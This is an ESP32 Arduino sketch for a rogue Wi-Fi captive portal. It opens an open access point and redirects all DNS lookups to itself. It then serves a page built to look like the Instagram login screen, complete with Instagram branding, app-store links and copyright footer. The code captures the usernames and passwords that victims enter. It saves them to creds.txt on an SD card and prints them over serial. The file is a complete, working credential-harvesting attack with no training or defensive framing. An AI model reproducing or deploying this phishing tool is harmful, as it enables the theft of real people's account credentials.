#include <DNSServer.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include "ESPAsyncWebServer.h"
#include "FS.h"
#include "SD.h"
#include "SPI.h"
#include <SPIFFS.h>


DNSServer dnsServer;
AsyncWebServer server(80);

String user_name;
String password;
bool name_received = false;
bool password_recevied = false;


const char index_html[] PROGMEM = R"rawliteral(

<!DOCTYPE HTML><html>


<body>\
<style>
/* Universal Selectors */
#root, body, html {
  height:100%;
}

body {
  overflow-y: scroll;
}

a, abbr, acronym, address, applet, article, aside, audio, b, big, blockquote, body, canvas, caption, center, cite, code, dd, del, details, dfn, div, dl, dt, em, embed, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, header, hgroup,   , i, iframe, img, ins, kbd, label, legend, li, mark, menu, nav, object, ol, output, p, pre, q, ruby, s, samp, section, small, span, strike, strong, sub, summary, sup, table, tbody, td, tfoot, th, thead, time, tr, tt, u, ul, var, video {
  margin:0;
  padding:0;
  border:0;
  font:inherit;
  vertical-align: baseline;
} 

a, a:visited {
  text-decoration: none;
}
a:active, .btn:active {
  opacity:.5;
}

ol, ul {
  list-style: none;
}

body, button, input {
  font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
  font-size:14px;
  line-height:18px;
}

#root, article, main, div, section, header, nav, footer {
  border: 0 solid #000000;
  box-sizing: border-box;
  align-items: stretch;
  display: flex;
  flex-direction: column;
  flex-shrink: 0;
  margin:0;
  padding:0;
  position: relative;
  -webkit-box-align: stretch;
    -moz-box-align: stretch;
  -webkit-box-orient: vertical;
    -moz-box-orient: vertical;
  -webkit-box-direction: normal;
    -moz-box-direction: normal;
} /* <--Universal Selectors End */


#root {
  z-index: 0;
}

.section-all {
  min-height:100%;
  overflow:hidden;
}

.main {
  background-color: #fafafa;
  order: 4;
  flex-grow: 1;
  -webkit-box-flex: 1;
  -moz-box-flex: 1;
  -moz-box-ordinal-group: 5;
  -webkit-box-ordinal-group: 5;
}

.wrapper {
  min-height:100%;
  overflow: hidden;
}

.wrapper, .article {
  flex-grow: 1;
  justify-content: center;
  -webkit-box-flex: 1;
    -moz-box-flex: 1;
  -webkit-box-pack: center;
    -moz-box-pack: center;
}

.article {
  flex-direction: row;
  margin:0 auto;
  max-width: 935px;
  width:100%;
  -webkit-box-orient: horizontal;
    -moz-box-orient: horizontal;
  -webkit-box-direction: normal;
    -moz-box-direction: normal;
}

.content {
  color:#262626;
  flex-grow:1;
  justify-content: center;
  max-width: 350px;
  margin-top:12px;
  -webkit-box-pack: justify;
    -moz-box-pack: justify;
  -webkit-box-flex: 1;
    -moz-box-flex: 1;  
}

.login-box {
  background: #fff;
  border: 1px solid #e6e6e6;
  border-radius: 1px;
  margin:0 0 10px;
  padding: 10px 0;
  /* align-items: center; */
}

.header {
  margin: 14.45px auto 12px;
}

.logo {
  background: cover no-repeat;
  width:175px;
  height:auto;
}

.form {
  display: flex;
  flex-direction: column;
  margin-bottom: 10px;
  -moz-box-direction: normal;
  -webkit-box-direction: normal;
}

.input-box {
  margin:auto 40px 6px;
}

input {
  height: 36px;
  border: 1px solid #efefef;
  border-radius: 3px;
  background-color: #fafafa;
  width:100%;
  font-size:12px;
  margin: 0;
  padding: 9px 0 7px 8px;
  outline: none;
  overflow: hidden;
  text-overflow: ellipsis;
  box-sizing: border-box;
}
input#name:focus, input#password:focus {
  border-color:#bbb;
}

.button-box {
  display: block;
  position: relative;
  margin: 8px 40px;
}
.btn {
  cursor: pointer;
  width: 100%;
  padding:0 8px; 
  background: #3897f0;
  border:1px solid #3897f0;
  color:#fff;
  border-radius:3px;
  font-weight:600;
  font-size: 14px;
  height: 28px;
  line-height: 26px;
  outline: none;
  white-space: nowrap;
}

.forgot, .forgot:active, .forgot:hover, .forgot:visited {
  font-size:12px;
  margin-top:12px;
  text-align: center;
  color:#003569;
  line-height: 14px!important;
}

.text {
  text-align:center;
  margin:15px;
  color:#262626;
  font-size:14px;
}

.text a, .text a:visited, .text a:hover, .text a:active {
  color:#3897f0;
  margin-left:3px;
}

/* App Store */
.app p {
  line-height: 18px;
  color:#262626;
  font-size:14px;
  text-align:center;
  margin:10px 20px;
}

.app-img {
  flex-direction: row;
  justify-content: center;
  margin:10px 0;
  -webkit-box-orient: horizontal;
  -moz-box-orient: horizontal;
}

.app-img a {
  margin-right:8px;
  height: 43.5px;
}

.app-img img {
  height:40px;
}

/* FOOTER */
.footer {
  background-color: #fafafa;
  order: 5;
  padding: 0 20px;
  background: #fafafa;
}

.footer-container {
  flex-direction: row;  
  flex-wrap:wrap;
  background-color: #fafafa;
  justify-content: space-between;
  padding: 38px 0;
  max-width:935px;
  font-size:12px;
  font-weight:600;
  margin:0 auto;
  text-transform:uppercase;
  width:100%
}

.footer-nav {
  max-width:100%;
}

.footer-nav ul {
  margin-right:16px;
  margin-bottom:3px;
  flex-grow:1;
}

.footer-nav ul li {
  display: inline-block;
  margin-right: 13px;
  margin-bottom:7px;
}

.footer-nav ul li a {
  color: #003569;
  text-decoration: none;
}

.footer span {
  color:#999;
}

span.language { 
  color: #003569;
  cursor: pointer;
  display: inline-block;
  font-weight: 600;
  position: relative;
  text-transform: uppercase;
  vertical-align: top;
}

.select {
  cursor: pointer;
  height: 100%;
  top: 0;
  opacity: 0;
  position: absolute;
  left:0;
  width: 100%;
}

/* Media Queries */
@media (max-width:450px) {
  .main {
    background-color: #fff;
  }

  .content {
    max-width: 100%;
    margin-top: 0;
    justify-content: space-between;
  }

  .login-box {
    background-color: transparent;
    border:none;
  }

  .logo {
    background: cover no-repeat;
    width:175px;
    height:auto;
    margin:0 auto;
  }

  .btn {
    cursor: pointer;
    width: 100%;
    padding:0 8px; 
    background: #3897f0;
    border:1px solid #3897f0;
    color:#fff;
    border-radius:3px;
    font-weight:600;
    font-size: 14px;
    height: 28px;
    line-height: 26px;
    outline: none;
    white-space: nowrap;
  }

  .input-box {
    border: 1px solid #efefef;
    border-radius: 3px;
    height: 36px;
    background: #fafafa;
    position: relative;
  }

  input {
    border: 0;
    background-color: #fafafa;
    width:100%;
    font-size:12px;
    margin: 0;
    padding: 9px 0 7px 8px;
    outline: none;
    overflow: hidden;
    text-overflow: ellipsis;
    box-sizing: border-box;
  }

  .input-box:hover, .input-box:focus {
    border-color:#bbb;
  }

}

@media only screen and (max-width:875px) {
  .footer-container {
    text-align: center;
    padding:10px 0;
  }
  .footer-container,  .footer-nav ul {
    justify-content: center;
    margin:0 auto;
    max-width: 360px;
    min-width: auto;
    -webkit-box-pack: center;
    -moz-box-pack: center;
  }

}
</style>
  <span id="root">
    <section class="section-all">

      <!-- 1-Role Main -->
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo" <img src="logo", alt="Instagram">
                </div><!-- Header end -->
                <div class="form-wrap">
                  <form class="form" action="/get">

                    <div class="input-box">
                      <input type="text" name="name" id="name" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" value="" required>
                    </div>  

                    <div class="input-box">
                      <input type="password" name="password" id="password" placeholder="Password" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                    </div>  

                    <span class="button-box">
                      <input type="submit" value="Submit"></button>
                    </span>  

                    <a class="forgot" href="">Forgot password?</a>
                  </form>
                </div> <!-- Form-wrap end -->
              </div> <!-- Login-box end -->

              <div class="login-box">
                <p class="text">Don't have an account?<a href="#">Sign up</a></p>
              </div> <!-- Signup-box end -->

              <div class="app">
                <p>Get the app.</p>
                <div class="app-img">
                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                    <img src="appstore.png">
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                    <img src="googleplaystore">
                  </a>  
                </div>  <!-- App-img end-->
              </div> <!-- App end -->
            </div> <!-- Content end -->
          </article>
        </div> <!-- Wrapper end -->
      </main>

      <!-- 2-Role Footer -->
      <footer class="footer" role="contentinfo">
        <div class="footer-container">

          <nav class="footer-nav" role="navigation">
            <ul>
              <li><a href="">About Us</a></li>
              <li><a href="">Support</a></li>
              <li><a href="">Blog</a></li>
              <li><a href="">Press</a></li>
              <li><a href="">Api</a></li>
              <li><a href="">Jobs</a></li>
              <li><a href="">Privacy</a></li>
              <li><a href="">Terms</a></li>
              <li><a href="">Directory</a></li>
              <li>
                <span class="language">Language
                  <select name="language" class="select" onchange="la(this.value)">
                    <option value="#">English</option>
                  </select>
                </span>
              </li>
            </ul>
          </nav>

          <span class="footer-logo">&copy; 2018 Instagram</span>
        </div> <!-- Footer container end -->
      </footer>
      
    </section>
  </span> <!-- Root -->

  <!-- Select Link -->
 
</body>

)rawliteral";



class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request){
    //request->addInterestingHeader("ANY");
    return true;
  }

  void handleRequest(AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", index_html); 
  }
};

void appendFile(fs::FS &fs, const char * path, const char * message){
    Serial.printf("Appending to file: %s\n", path);

    File file = fs.open(path, FILE_APPEND);
    if(!file){
        Serial.println("Failed to open file for appending");
        return;
    }
    if(file.print(message)){
        Serial.println("Message appended");
    } else {
        Serial.println("Append failed");
    }
    file.close();
}


void setupServer(){

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
      request->send_P(200, "text/html", index_html); 
      Serial.println("Client Connected");
  });

  server.on("/logo", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/logo.png", "image/png");
  });

  server.on("/get", HTTP_GET, [] (AsyncWebServerRequest *request) {
      String inputMessage;
      String inputParam;
  
      if (request->hasParam("name")) {
        inputMessage = request->getParam("name")->value();
        inputParam = "name";
        user_name = inputMessage;
        Serial.println(inputMessage);
        name_received = true;
      }

      if (request->hasParam("password")) {
        inputMessage = request->getParam("password")->value();
        inputParam = "password";
        password = inputMessage;
        Serial.println(inputMessage);
        password_recevied = true;
      }
      request->send(200, "text/html", "Re-Directing");
  });
}
void setup(){
  //your other setup stuff...
  Serial.begin(115200);
   if(!SD.begin()){
        Serial.println("Card Mount Failed");
        return;
    }
    uint8_t cardType = SD.cardType();
    uint64_t cardSize = SD.cardSize() / (1024 * 1024);


  Serial.println();
  Serial.println("Setting up AP Mode");
  WiFi.mode(WIFI_AP); 
  WiFi.softAP("Change Me");
  Serial.print("AP IP address: ");Serial.println(WiFi.softAPIP());
  Serial.println("Setting up Async WebServer");
  setupServer();
  Serial.println("Starting DNS Server");
  dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);//only when requested from AP
  //more handlers...
  server.begin();
  Serial.println("All Done!");
}


void loop(){
  dnsServer.processNextRequest();
  if(name_received && password_recevied){

    
      appendFile(SD, "/creds.txt", user_name.c_str());
      appendFile(SD, "/creds.txt", ":");
      appendFile(SD, "/creds.txt", password.c_str());
      appendFile(SD, "/creds.txt", "\n");



      Serial.print(user_name);Serial.println("");Serial.println(password);
      name_received = false;
      password_recevied = false;
      Serial.println("");
    }
}
